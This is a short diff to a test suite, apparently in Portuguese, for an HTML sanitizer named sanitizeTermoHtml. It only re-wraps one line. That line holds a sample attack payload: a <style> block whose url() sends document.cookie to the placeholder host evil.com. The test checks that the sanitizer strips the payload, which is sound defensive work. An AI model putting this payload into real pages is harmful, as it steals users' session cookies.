@@ -13,7 +13,8 @@ describe('sanitizeTermoHtml — vetores de ataque', () => {
 	});
 
 	it('remove <style> que permite exfiltração via background-image:url()', () => {
-		const html = '<style>p { background: url("//evil.com/?cookie=" + document.cookie); }</style><p>ok</p>';
+		const html =
+			'<style>p { background: url("//evil.com/?cookie=" + document.cookie); }</style><p>ok</p>';
 		const out = sanitizeTermoHtml(html);
 		expect(out).not.toContain('style');
 		expect(out).not.toContain('evil.com');
